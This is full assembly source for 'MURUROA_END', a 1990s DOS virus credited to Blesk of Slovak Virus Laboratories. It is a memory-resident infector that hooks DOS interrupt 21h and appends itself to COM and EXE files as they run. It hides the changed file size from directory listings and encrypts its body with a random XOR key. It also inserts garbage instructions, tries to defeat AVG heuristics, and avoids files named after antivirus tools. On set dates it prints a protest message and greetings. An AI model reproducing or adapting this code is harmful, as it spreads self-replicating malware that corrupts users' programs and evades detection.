.286
	;********************************************************
        ;* This source was created by Blesk/SVL in 23.03.1996   *
	;********************************************************
        ;*              (C)  Blesk/SVL 1996/97                  *
        ;********************************************************

codes segment
             assume   cs:codes, ds:codes, ss:codes
        org   100h
startprog:

	virlength     		equ   end_vir-begin
        mem_to_res              equ   140h

	jmp	  svir                ; Jump to VIRUS
	nop
	nop
	nop
	mov	  ah,4ch
	int	  21h

_virus:
begin:

;============== UTIL TO restore infected program in memory ==================
beg_c:
          call     avg_fuck
          pop      es
          push     es
          mov      ax,es
          add      ax,10h

          add      [cs:((offset eps) - begin)+si],ax
          add      [cs:((offset ess) - begin)+si],ax
          cmp      byte ptr [cs:((offset com_exe) - begin)+si],'c'
          jnz      _exe_type
          mov      ax,[cs:((offset orig_instr)-begin)+si]
          mov      [cs:100h],ax
          mov      ax,[cs:((offset orig_instr)-begin+2)+si]
          mov      [cs:102h],ax
          mov      [cs:((offset eps)-begin)+si],cs
          mov      [cs:((offset epo)-begin)+si],100h
          mov      [cs:((offset ess)-begin)+si],cs
_exe_type:
          pop      es
          push     es

          push     cs
          pop      ds

;================ UTIL TO try if is virus now in memory =====================

        mov        ax,1996h
        int        21h
        cmp        ax,9619h
        jz         _instaled

;======================= UTIL TO get addr INT21h ============================

        push     bx
        push     es
        mov      ax,3521h
        int      21h
        mov      word ptr [cs: (or_21-begin)+si],bx
        mov      word ptr [cs: (or_21-begin)+2+si],es
        mov      word ptr [cs: (org_21-begin)+si],bx
        mov      word ptr [cs: (org_21-begin)+2+si],es
        pop      es
        pop      bx
;===================== UTIL TO GET MEM FOR VIRUS ============================

        pop        es
        push       es

        push       ds
        mov        ax,es
        dec        ax
        dec        ax
        mov        es,ax
        cmp        byte ptr [es:10h],5ah
        jz         no_end1
_end2:  jmp        _end1
no_end1:
        mov        ax,[es:13h]
        sub        ax,mem_to_res
        jc         _end2
        mov        [es:13h],ax
        sub        word ptr [es:22h],mem_to_res
        mov        es,[es:22h]
        pop        ds
;===================== UTIL TO move virus in MEMORY =========================

        xor        di,di
        cld
        push       si
        mov        cx,virlength
        repz       movsb
        pop        si

;======================= UTIL TO INITIALEZE VIRUS ===========================

        mov        ax,2521h
        push       es
        pop        ds
        mov        dx,(_int21-begin)
        int        21h

;=========== Pop and go to original ============

_instaled:
_end1:
             pop      es
_p11:        pop      bp
_p21:        pop      ds
_p31:        pop      es
_p41:        pop      dx
_p51:        pop      cx
_p61:        pop      bx
_p71:        pop      ax
             pop      si

             mov        ss,[cs:((offset ess)-begin)+si]
             push       [cs:((offset eps)-begin)+si]
             push       [cs:((offset epo)-begin)+si]
             retf

;############################################################################

;==================== Code to CALL and JMP to orig 21H ======================

dos:
             pushf
             db       9ah    ; CALL xxxx:xxxx
or_21:	     dd       0
             ret
To_21:
             db       0eah   ; JMP  xxxx:xxxx
Org_21:
             dw       0,0

;=============Cange DTA====================================
change_dta:  pushf
             push       ax
             push       bx
             push       cx
             push       dx
             push       es
             mov        ah,2fh
             call       dos
             mov        dx,[es: word ptr bx+18h]
             and        dh,0c0h
             cmp        dh,0c0h
             jnz        not_inf_dta;
             mov        dx,[es: word ptr bx+18h]
             and        dh,3fh
             mov        [es: word ptr bx+18h],dx
             sub        word ptr [es: word ptr bx+1ah],virlength
             sbb        word ptr [es: word ptr bx+1ch],0
not_inf_dta: pop        es
             pop        dx
             pop        cx
             pop        bx
             pop        ax
             popf
             ret
;=======find first via handle=============
ffvh:        popf
             call       dos
             jc         ffvh2
             call       change_dta
ffvh2:       retf       2

;======find first/next via fcb=============================
ffvfcb:      popf
             call       dos
             pushf
             cmp        al,00
             jnz        no_found
             push       ax
             push       bx
             push       cx
             push       dx
             push       es
             mov        ah,2fh
             call       dos
             mov        al,[es: word ptr bx]
             cmp        al,0ffh
             jnz        @ew
             add        bx,8
@ew:
             mov        dx,[es: word ptr bx+18h]
             and        dh,0c0h
             cmp        dh,0c0h
             jnz        not_inf_dta2;
             mov        dx,[es: word ptr bx+18h]
             and        dh,3fh
             mov        [es: word ptr bx+18h],dx
             sub        word ptr [es: word ptr bx+1ch],virlength
             sbb        word ptr [es: word ptr bx+1eh],0
not_inf_dta2:
             pop        es
             pop        dx
             pop        cx
             pop        bx
             pop        ax

no_found:    popf
             iret
;==========================================================
Stupid_Tex_For_Now_:       ; May be not 8))) 
             db    ' I am in LOVE now... ZUZANKA B.B. in Slovakia <:)<8< '
;############################################################################
;              !!!!!!!!!!!!! here is my int 21h !!!!!!!!!!!!!
;############################################################################
ffvh3:       jmp        ffvh
ffvfcb1:     jmp        ffvfcb
_int21:
             pushf
             cmp        ax,1996h
             jnz        _next
             xchg       ah,al
             popf
             sti
             iret
_next:
             cmp        ax,4b00h
             jnz        _infe
             jmp        _infect
_infe:
             cmp        ah,4eh
             jz         ffvh3

             cmp        ah,4fh
             jz         ffvh3

             cmp        ah,12h
             jz         ffvfcb1

             cmp        ah,11h
             jz         ffvfcb1


;========================================================
_jmp_dos:
             popf
             jmp        To_21
;========================================================
;############################################################################
include files.inc
;############################################################################
;############################################################################
;============= Util to add virus to open file =====================
add_to_file:
	     call           end_file
	     push           bp
             push           es
             push           ds
             push           di
             push           si

             push           cs
             pop            es
             push           cs
             pop            ds

             mov            cx,[cs: word ptr (num_reloc-begin)]
             mov            bx,(table_reloc-begin)

R_continue:
             push           cx
             push           bx

             mov            di,[cs: word ptr bx]
             mov            dl,[cs: byte ptr bx+2]
             xor            dh,dh
zt4:         call           DEADCODE
             add            di,2
             dec            dx
             jnz            zt4

             pop            bx
             add            bx,3  ;<= go to next position in TABLE
             pop            cx
             dec            cx
             jnz            R_continue



rtyt:
             call           rnd_byte
             cmp            al,0
             jz             rtyt
             mov            [cs:byte ptr (_value-begin)],al

             mov            di,(buff-begin)         ; Move
             xor            si,si

             xor            dx,dx
             mov            ax,(end_c-begin)       ; Crypt
             mov            bx,40h
             div            bx
             mov            cx,ax                  ; Count how much blocks
ccykl:
             mov            bx,40h
             mov            di,(buff-begin)
cccykl:      mov            al,[si]                ; Crypt 1 40h block
             xor            al,[cs:byte ptr (_value-begin)]
             mov            [di],al                ;
             inc            si
             inc            di
             dec            bx
             jnz            cccykl                 ; Loop to Crypt routine
             push           cx
             push           dx
             push           si
             push           di
             call           end_file
             mov            dx,(buff-begin)        ; And Save that BLOCK
             mov            cx,40h
             call           write_file
             call           end_file
             pop            di
             pop            si
             pop            dx
             pop            cx
             dec            cx
             jnz            ccykl                  ; Last COMPLET 40h block

                                                   ; yes => Crypt last few
             cmp            dx,0
             jz             _no_last_few
             push           dx
                                                   ; bytes (les than 40h)
             mov            di,(buff-begin)
cykl:        mov            al,[si]                ; Crypt block
             xor            al,[cs:byte ptr (_value-begin)]
             mov            [di],al                ;
             inc            si
             inc            di
             dec            dx
             jnz            cykl                   ; Loop to Crypt routine
             call           end_file
             mov            dx,(buff-begin)        ; And Save last uncomplet
             pop            cx                     ; BLOCK
             call           write_file
             call           end_file
_no_last_few:
             mov            cx,(buff-end_c)     ; Copy decryptor
             push           cs                     ; to buff
             push           cs                     ;
             pop            ds                     ;
             pop            es                     ;
             mov            di,(buff-begin)        ;
             cld                                   ;
             repz           movsb                  ;

             call           end_file
             mov            cx,(buff-end_c)        ;
             mov            dx,(buff-begin)        ; AND save it !!!!
             call           write_file             ;
             call           end_file
             pop            si
             pop            di
             pop            ds
             pop            es
             pop            bp
             ret
;=====================================================================
;############################################################################
;############################################################################
;############################################################################
;================ Util to mark infected file via date ================
Mark_file:
             mov        ax,5700h
             mov        bx,[cs:( handle - begin )]
             call       dos
             or         dh,0c0h
             mov        ax,5701h
             call       dos
             ret
;=====================================================================
;############################################################################
;############################################################################
;############################################################################
;===================== Data used by VIRUS ============================
EXE_HEADER:  db         'MZ'                     ;header of exe file
lastpage:    dw         ?                        ;Bytes in last page
nopages:     dw         ?                        ;Count of pages
RELOC:       dw         ?                        ;Count of relocate items
HederSize:   dw         ?                        ;Heder size
MinMem:      dw         ?
MaxMem:      dw         ?
ReloSS:      dw         ?                        ;Initial SS
ReloSP:      dw         ?                        ;Initial SP
CeckSum:     dw         ?                        ;DOS 3.00+ not use it !!!!
StartIP:     dw         ?                        ;Starting IP
StartCS:     dw         ?                        ;Starting CS
OfsRelo:     dw         ?                        ;Relocation table's offset
OVRType:     dw         ?                        ;0=Main segment
nope  :      dw         ?
pklite:      dw         ?                        ;PKLITE = PK sign .. Don't
                                                 ;INFECT !!!!!
;############################################################################
Old_21     : dd ?
Time       : dw ?
date       : dw ?
Handle     : dw ?
virussize    equ        (offset end_vir)-(offset _virus)
com_exe  : dw 'c'
;############################################################################
_vypis:      push       ax
             push       dx
             push       cx
             push       ds

             push       cs
             pop        ds

             mov        ah,04
             int        1ah
             cmp        dh,05h                    ; Month = 5 ???
             jnz        not_vypis
             cmp        dl,04h                    ; Day = 4 ???
             jz         y_vypis
             cmp        dl,08h                    ; Day = 8 ???
             jz         y_vypis
             cmp        dl,14h                    ; Day = 14 ???
             jz         y_vypis
             jmp        not_vypis
y_vypis:
             call       beep

             mov        dx,(text1-begin)
             mov        ah,09h
             call       dos
             call       line                  ; 49 x Í
             mov        dx,(text2-begin)
             mov        ah,09h
             call       dos
             call       line                  ; 49 x Í
             mov        dx,(text3-begin)
             mov        ah,09h
             call       dos
             call       line                  ; 49 x Í
             mov        dx,(text4-begin)
             mov        ah,09h
             call       dos
             call       line                  ; 49 x Í
             mov        dx,(text5-begin)
             mov        ah,09h
             call       dos

             mov        ah,08
             call       dos
             call       beep

not_vypis:
             pop        ds
             pop        cx
             pop        dx
             pop        ax

             ret
;==========================================================
line:
             mov        cx,49
lllll:       mov        dl,'Í'
             mov        ah,06h
             call       dos
             loop       lllll
             ret
;==========================================================
beep :
       push ax
       mov ax,0e07h
       int 10h
       pop ax
       ret
;==========================================================
; 0cdh - line
text1:       db         13,10
             db         0c9h,'$'
text2:
             db         0bbh,13,10
             db         0bah,'   I have one mesage to all people on earth :    ',0bah
             db         13,10
             db         0cch,'$'
text3:       db         0b9h,13,10
             db         0bah,' All French nuc. test`s was STOPED. But MURUROA  ',0bah
             db         13,10
             db         0bah,'  IS DEAD !!!!! I am a coder of HELL FIRE and I  ',0bah
             db         13,10
             db         0bah,'   BRING  YOU  >>>>>> FIRE <<<<<< By Blesk/SVL   ',0bah
             db         13,10
             db         0bah,'NOTE:    Name of this virus is [MURUROA_END]     ',0bah
             db         13,10
             db         0bah,' By Blesk from Slovak Virus Laboratories at .SK  ',0bah
             db         13,10
             db         0bah,' Real name of BOZA is BIZATCH.. STUPID A-VERS !!!',0bah
             db         13,10
             db         0bah,'    PLUTONIUM IS BETTER IN POWER-PLANT !!!!      ',0bah
             db         13,10
             db         0bah,' My greet to: VYVOJAR,SVL,VLAD,SKIMS,40-hex,IR   ',0bah
             db         13,10
             db         0cch,'$'
text4:
             db         0b9h,13,10
             db         0bah,' And to some my friends:    DJ.Milan,DJ.Maros,   ',0bah
             db         13,10
             db         0bah,' DJ.Babula(Baby),TINA-huhu,DURO,LACI,Duffy,Kaaa, ',0bah
             db         13,10
             db         0bah,' Stano ...and more... A zdravim Mira Trnku  8))  ',0bah
             db         13,10
             db         0c8h,'$'
text5:
             db         0bch,13,10
             db         13,10,'$'

;############################################################################
;=====================================================================
;############################################################################
;############################################################################
;############################################################################
;============== Utils to infect files !!!! ===========================
_infect:
             push       ax
             push       bx
             push       cx
             push       es
             push       dx
             push       ds
             call       _vypis
             call       infect_files
             pop        ds
             pop        dx
             pop        es
             pop        cx
             pop        bx
             pop        ax
             jmp        _jmp_dos
;=====================================================================
; ======================= INT_24.INC By Blesk/SVL ========================

int24:          dw      0,0

;============ Hook int 24h and store original vector =====================
Hook_24:
                push    es
                push    ax
         ; ==================================================
                xor     ax,ax
                mov     es,ax
                mov     ax,[es: word ptr (24h*4)]
                mov     [cs: word ptr (int24-begin)],ax
                mov     ax,[es: word ptr (24h*4+2)]
                mov     [cs: word ptr (int24-begin+2)],ax
         ; ======== Check INT 24 vector =====================
                mov     ax,(INT_24-begin)
                mov     [es: word ptr (24h*4)],ax
                push    cs
                pop     ax
                mov     [es: word ptr (24h*4+2)],ax
         ; ======== Set new INT 24 vector ===================
                pop     ax
                pop     es
                ret

;============ UnHook int 24h and restore original vector =================
UnHook_24:
                push    es
                push    ax
         ; ==================================================
                xor     ax,ax
                mov     es,ax
                mov     ax,[cs: word ptr (int24-begin)]
                mov     [es: word ptr (24h*4)],ax
                mov     ax,[cs: word ptr (int24-begin+2)]
                mov     [es: word ptr (24h*4+2)],ax
         ; ======== Restore INT 24 vector =====================
                pop     ax
                pop     es
                ret
;==============================MY int 24h=================================
INT_24:
                mov     al,03
                iret
;=========================================================================
infect_files:
             call       Hook_24
             call       findstr
             cmp        byte ptr [cs:((offset nasiel_s)-begin)],0ffh
             jz         can_infect
             jmp        NoInfecting
can_infect:
             call       open_file

             mov        cx,4h
             mov        dx,((offset exe_header)-begin)
             call       read_file

             cmp        word ptr [cs:((offset exe_header)-begin)],5a4dh
             jnz        com_infect
             call       exe_infect
             jmp        clo_infect
com_infect:  call       infect_com
clo_infect:  call       close_file
NoInfecting:
             call       UnHook_24
             ret
;=====================================================================
infect_com:
             call       begin_file
             jnc         cic2
             jmp         cic
cic2:
             mov        cx,4h
             mov        dx,((offset exe_header)-begin)
             call       read_file
             jc         cic
             push       cs
             pop        ds
             mov        ax,[ds:((offset exe_header)-begin)]
             mov        [ds:((offset orig_instr)-begin)],ax
             mov        ax,[ds:((offset exe_header)-begin+2)]
             mov        [ds:((offset orig_instr)-begin+2)],ax
             call       end_file
             add        ax,virlength
             jc         cant_infect_com
             sub        ax,virlength

             mov        bx,[cs:((offset handle)-begin)]
             mov        cx,0ffffh
             mov        dx,0fffeh
             mov        ax,4202h
             call       dos

             mov        dx,((offset exe_header)-begin)
             mov        cx,2
             call       read_file

             cmp        word ptr [cs: ((offset exe_header)-begin)],1111h
             jz         cant_infect_com
             call       end_file
             push       ax
             call       begin_file
             pop        ax

             sub        ax,3
             add        ax,(svir-begin)
             mov        [cs:((offset exe_header)-begin+1)],ax
             mov        al,0E9h
             mov        [cs:((offset exe_header)-begin)],al
             mov        cx,3h
             mov        dx,(offset exe_header)-begin
             mov        byte ptr [cs:((offset com_exe)-begin)],'c'


             call       write_file

             jc         cic
             call       end_file
             jc         cic
             add        ax,100h
             mov        [cs: word ptr (delta-begin)],ax
             sub        ax,100h
             call       add_to_file
             call       mark_file

cic:
cant_infect_com:

          ret
;==========================================================
exe_infect:
             mov        cx,0ffffh
             mov        dx,0fffeh
             mov        ax,4202h
             call       dos

             mov        cx,2
             mov        dx,(offset buff)-begin
             call       read_file
             cmp        word ptr [cs:((offset buff)-begin)],1111h
             jz         cic

             call       begin_file

             mov        cx,20h
             mov        dx,(offset exe_header)-begin
             call       read_file

             cmp        word ptr [cs:((offset ovrtype)-begin)],0000
             jnz        cic
             cmp        word ptr [cs:((offset pklite)-begin)],'PK'
             jz         cic

             mov        bx,[cs:((offset reloSS)-begin)]
             mov        [cs:((offset ess)-begin)],bx
             mov        bx,[cs:((offset startIP)-begin)]
             mov        [cs:((offset epo)-begin)],bx
             mov        bx,[cs:((offset startCS)-begin)]
             mov        [cs:((offset eps)-begin)],bx


             add        word ptr [cs:((offset reloSS)-begin)],10h
             add        word ptr [cs:((offset minmem)-begin)],100h
             add        word ptr [cs:((offset maxmem)-begin)],100h
             jnc        NoCaryMem
             mov        word ptr [cs:((offset maxmem)-begin)],0ffffh
NoCaryMem:
             mov        byte ptr [cs:((offset com_exe)-begin)],'E'

             mov        ax,virussize
             mov        bx,200h
             xor        dx,dx
             div        bx
             add        word ptr [cs:((offset nopages)-begin)],ax
             add        dx,word ptr [cs:((offset lastpage)-begin)]
             xchg       ax,dx
             xor        dx,dx
             div        bx
             mov        word ptr [cs:((offset lastpage)-begin)],dx
             add        word ptr [cs:((offset nopages)-begin)],ax
             call       end_file
             push       si
             push       di

             mov        di,dx
             mov        si,ax

             mov        ax,[cs:((offset hedersize)-begin)]
             mov        bx,10h
             mul        bx

             sub        si,ax
             sbb        di,dx
             mov        dx,di
             mov        ax,si
             pop        di
             pop        si
             mov        bx,10h
             div        bx
             mov        [cs:  word ptr (delta-begin)],dx
             add        dx,(svir-begin)  ; START at Svir
             mov        [cs:((offset startIP)-begin)],dx
             mov        [cs:((offset startCS)-begin)],ax

             call       begin_file
             mov        cx,1ch
             mov        dx,((offset EXE_header)-begin)
             call       write_file
             call       end_file
             call       add_to_file
             call       Mark_file

@44:         ret


;==========================================================



;############################################################################
;############################################################################
My_Favourite_paper_magazine:   db ' I love PC Revue .... '

;################################################################
;################################################################
;###    Here is located RELOC table to put dumb instruction   ###
;################################################################
;################################################################

num_reloc:
  dw    38
table_reloc:
  dw  dumb1-begin
  db  5
  dw  dumb2-begin
  db  23
  dw  dumb3-begin
  db  9
  dw  dumb4-begin
  db  3
  dw  dumb5-begin
  db  6
  dw  dumb6-begin
  db  16
  dw  dumb7-begin
  db  7
  dw  dumb8-begin
  db  3
  dw  dumb9-begin
  db  3
  dw  dumb10-begin
  db  9
  dw  dumb11-begin
  db  1
  dw  dumb12-begin
  db  3
  dw  dumb13-begin
  db  32
  dw  dumb14-begin
  db  4
  dw  dumb15-begin
  db  5
  dw  dumb16-begin
  db  5
  dw  dumb17-begin
  db  15
  dw  dumb18-begin
  db  8
  dw  dumb19-begin
  db  3
  dw  dumb20-begin
  db  4
  dw  dumb21-begin
  db  8
  dw  dumb22-begin
  db  6
  dw  dumb23-begin
  db  1
  dw  dumb24-begin
  db  1
  dw  dumb25-begin
  db  2
  dw  dumb26-begin
  db  13
  dw  dumb27-begin
  db  3
  dw  dumb28-begin
  db  3
  dw  dumb29-begin
  db  3
  dw  dumb30-begin
  db  3
  dw  dumb31-begin
  db  3
  dw  dumb32-begin
  db  3
  dw  dumb33-begin
  db  3
  dw  dumb34-begin
  db  3
  dw  dumb35-begin
  db  3
  dw  dumb36-begin
  db  3
  dw  dumb37-begin
  db  3
  dw  dumb38-begin
  db  3

;################################################################
;======================== FIND.INC Thanx to SVL ==========================


analiza:
     ;      ds:dx  =>'c:\path\name.ext',0
      push  ax
      push  si
      push  dx
      push  dx  ;   ds:dx = ds:si
      pop   si
analiza2:
      cmp   byte ptr [si],'\'
      jz    lomitko
      cmp   byte ptr [si],0
      jz    end_name
      inc   si
      jmp   analiza2
lomitko:
      pop   ax
      inc   si
      push  si
      jmp   analiza2
end_name:
      pop   dx
      pop   si
      pop   ax
     ;      ds:dx  =>'name.ext',0
      ret

;-----------------------------------------------------------------------------
;Procedre FINDSTR check if string at adress DS:DX contain some1 word from
;table.
; Input:  DS:DX-> string
; Output: NASIEL_S =0 Contain  Nasiel_s = FFh Not contain

FINDSTR1 proc near
         pusha
         jmp findstr2

FINDSTR :
         pusha
         mov  byte ptr [cs:((offset nasiel_s)-begin)],0ffh
         call analiza
         push dx
         pop  si
         mov di,(offset tab-begin)
findstr2:mov bp,si
 compar0:mov cx,0
 compar1:xor bx,bx
 compar2:mov ah,byte ptr cs:[di+bx] ;AH= char from table
         cmp ah,0                   ; New word ????
         jnz  nextwor
         cmp cx,0
         jnz found
         jz  nextword
nextwor:
         cmp ah,1
         jz found_1
         mov al,byte ptr ds:[si+bx] ;AL= char from checked string

 ; UpChar

         cmp al,5bh             ;Make upcase of chars
         jns compar3
         cmp al,41h
         js compar3
         or al,20h

 compar3:
        cmp al,0
        jnz next_w              ;end of name ??? (try next)
        cmp cx,0
        jnz found
        jnz nextword
 next_w:
        inc bx
        inc dx
        inc cx
        cmp al,ah
        jz  compar2

 nextword:mov ah,cs:[di]
        inc di
        cmp ah,1                 ;If it is last word then mark NOT contain
        jz found_1
        cmp ah,0                 ;begin of new word ????
        jnz nextword
        jmp compar0              ;Yes check it !!!!!
  found:
        mov byte ptr [cs:((offset nasiel_s)-begin)],0h
found_1:popa
        ret

FINDSTR1 endp
nasiel_s:db 0
Exe db ".exe",0
Com db ".com",1
Tab db "avg",0
    db "fv386",0
    db "turbo",0
    db "fv86",0
    db "td",0
    db "stacker",0
    db "toolkit",0
    db "msav",0
    db "vc",0
    db "rex",0
    db "virlab",0
    db "vir",0
    db "alik",0
    db "guard",0
    db "nod",0
    db "tbav",0
    db "tbdriver",0
    db "clean",0
    db "f-pro",0
    db "avast",0
    db "asta",0
    db "tbscan",0
    db "debug",0
    db "cpav",0
    db "tlink",0
    db "vlad",0
    db "nav",0
    db "vshie",0
    db "dizz",0
    db "command",0
    db "hiew",0
    db "sswap",0
    db "scan",0
    db "tbclean",0
    db "vsafe",1
SpecForMT:     db ' For M.T.: Vivat Ziar nad Hronom.. 8)) Uz si rad ?? '
               db ' RADAR v PC Revue 9/94 '

; Who is M.T. ??? It is Slovak A-Ver 8) and this was my MSG
; FOR him
;******************************************************************************
; This procedure generates GARBAGE ( instructions which have no other purpose
; than to increase the variance of the code)
; G_TABLE.INC ==> table of destation adress and counts

last:      db     0

DEADCODE proc near
	   push   ds
	   pusha
           push   di
           push   si
           push   dx
           push   dx
           pop    si
  again:
	   call   RND_BYTE
	   and    al,00011111b

           cmp    al,14        ; check range <0,13>
           jnc    again        ; Index in table2
           cmp    al,[cs: byte ptr (last-begin)]
           jz     again
           mov    [cs:byte ptr (last-begin)],al

           mov    bx,table2-begin
           mov    ah,0
           add    ax,ax
           push   ax
           pop    si
           add    si,bx
           mov    bx,[cs: word ptr si]
           mov    [cs: word ptr di],bx


  D_CODE_END:
           pop    bp
           pop    si
           pop    di
	   popa
	   pop    ds
	   ret
;-----------------------------------------------------------
 RND_BYTE proc near
           in al,40h
	   ret
 rnd_byte endp


table2 :
          db   088h,0ffh,089h,0c9h,088h,0c9h,021h,0d2h
          db   089h,0c0h,088h,0c0h,088h,0e4h,089h,0dbh,088h,0dbh
          db   088h,0edh,089h,0d2h,088h,0d2h,088h,0f6h,02ch,000h

DEADCODE endp
end_c:
;================================================================

;################################################################
;########Kill Heuristick in AVG (sometimes and in TBAV)##########

old_20:  dw 0,0

my_20:
	iret

avg_fuck:
dumb27: dw       3 dup(9090h)
        mov	ax,3520h
        int	21h
dumb28: dw       3 dup(9090h)
        mov	word ptr [cs : (old_20 - begin)+si],bx
dumb29: dw       3 dup(9090h)
        mov	word ptr [cs : (old_20 - begin+2)+si],es
dumb30: dw       3 dup(9090h)

        push     cs
        pop     ds
dumb31: dw      3 dup(9090h)
        mov     dx,my_20-begin
        add     dx,si
dumb32: dw      3 dup(9090h)
        mov     ax,2510h
dumb33: dw      3 dup(9090h)
        add     ax,10h
        int     21h
dumb34: dw      3 dup(9090h)

        int     20h

        mov	dx, word ptr [cs: (old_20-begin)+si]
dumb35: dw      3 dup(9090h)
        mov	ds, word ptr [cs: (old_20-begin+2)+si]
dumb36: dw      3 dup(9090h)
        mov	ax,2520h
dumb37: dw      3 dup(9090h)
        int	21h
dumb38: dw      3 dup(9090h)

        ret
;############################################################################
;############################################################################
;==========================================================================;
             nop
_protector:  jmp        _protect1
             nop
int_8:       dw         0,0
_value:      db         0
dec_8:
              ;================(destruct instrucition at JAMP:)=========
             mov        ax,9090h
             mov        word ptr [cs : ((offset jjjj)-begin) + si],ax

decod1:      db         0b9h
             dw         end_c-beg_c
             push       si
             mov        dl,byte ptr [cs: (offset(_value)-offset(begin)) + si]
             cmp        dl,0
             jz         decod7
decod4:
             xor        [cs: byte ptr si+(beg_c-begin)],dl
             inc        si
decod6:      db         49h
             jnz        decod4
decod7:
             pop        si

             mov        al,20h
             out        20h,al

             iret


;==========================================================================

_protect1:
             sti
dumb2:       dw         23 dup(9090h)
             mov        ax,2h
             push       ax
dumb3:       dw         9 dup(9090h)
             pop        es
             mov        bx,word ptr [es: 0]
dumb4:       dw         3 dup(9090h)
             mov        ax,word ptr [es: 2]
dumb5:       dw         6 dup(9090h)
             mov        [cs:((offset int_8)-begin)+si],bx
dumb6:       dw         16 dup(9090h)
             mov        [cs:((offset int_8)-begin+2)+si],ax

             push       cs
dumb7:       dw         7 dup(9090h)
             pop        ds
             mov        dx,((offset dec_8)-begin)
             add        dx,si
dumb8:       dw         3 dup(9090h)
             mov        ax,word ptr [cs : ((offset jjjj)-begin) + si]
dumb9:       dw         3 dup(9090h)
             mov        word ptr [cs : ((offset backup)-begin) + si],ax
             cli
dumb10:      dw         9 dup(9090h)
             mov        word ptr [es: 0],dx
dumb11:      dw         1 dup(9090h)
             mov        word ptr [es: 2],ds
dumb12:      dw         3 dup(9090h)
             sti
jamp:
dumb13:      dw         32 dup(9090h)

jjjj:        jmp        jamp
             cli
             mov        dx,[cs:((offset int_8)-begin)+si]
dumb14:      dw         4 dup(9090h)
             mov        ax,[cs:((offset int_8)-begin+2)+si]
dumb15:      dw         5 dup(9090h)
             mov        word ptr [es: 0],dx
dumb16:      dw         5 dup(9090h)
             mov        word ptr [es: 2],ax
             sti
dumb17:      dw         15 dup(9090h)
             mov        ax,word ptr [cs : ((offset backup)-begin) + si]
dumb18:      dw         8 dup(9090h)
             call       dumb26
             mov        word ptr [cs : ((offset jjjj)-begin) + si],ax
             ret
backup:      dw         9090h

;############################################################################
;############################################################################
;############################################################################
;############################################################################
;############################################################################
;############################################################################

svir:

          db       0beh                    ;Stands for MOV SI,xxxx
delta     dw       offset begin            ;We'll put the data offset in.

          push     si
dumb1:    dw       5 dup(9090h)
_p10:     push     ax
          call     dumb26
          pop      ax
          call     dumb25
          push     ax
dumb19:   dw       3 dup(9090h)
          call     dumb25
_p20:     push     bx
dumb20:   dw       4 dup(9090h)
          call     dumb25
_p30:     push     cx
dumb21:   dw       8 dup(9090h)
          call     dumb26
_p40:     push     dx
dumb22:   dw       6 dup(9090h)
          call     dumb26
_p50:     push     es
dumb23:   dw       1 dup(9090h)
          call     dumb25
_p60:     push     ds
          call     dumb26
dumb24:   dw       1 dup(9090h)
          call     dumb26
_p70:     push     bp
          call     dumb26
          push     es

          push     si
          pusha
          call     avg_fuck
          popa
          pop      si

          call     _protector
jmp       beg_c
dumb26:   dw       13 dup(9090h)
          ret
dumb25:   dw       2 dup(9090h)
          jmp      dumb26

dddddd:   jmp      dumb25
epo        : dw ?
eps        : dw ?
ess        : dw ?
orig_instr : db 90h,90h,90h,90h
sign:
             dw         1111h
end_vir:
buff:
codes   ends
end     startprog
;#########################################################################
;##                    This source was generated by                     ##
;##                Blesk's Funky Generator by Blesk/SVL                 ##
;#########################################################################
;##                I used FOG - Funky Op code Generator                 ##
;##                           THANX ......                              ##
;#########################################################################
